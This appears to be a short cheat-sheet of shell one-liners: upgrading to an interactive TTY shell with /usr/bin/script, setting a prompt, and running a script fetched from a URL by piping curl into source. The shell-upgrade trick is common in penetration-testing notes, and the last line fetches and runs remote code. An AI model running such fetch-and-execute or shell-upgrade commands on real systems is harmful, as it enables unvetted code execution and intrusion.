
- Spawn TTY shell: `/usr/bin/script -qc /bin/bash /dev/null` 
  or with PWD: `/usr/bin/script -qc /bin/bash /dev/null && PS1='\u@\h:\w\$ '`

- Run script from URL: `source <(curl -s http://mywebsite.com/myscript.sh)`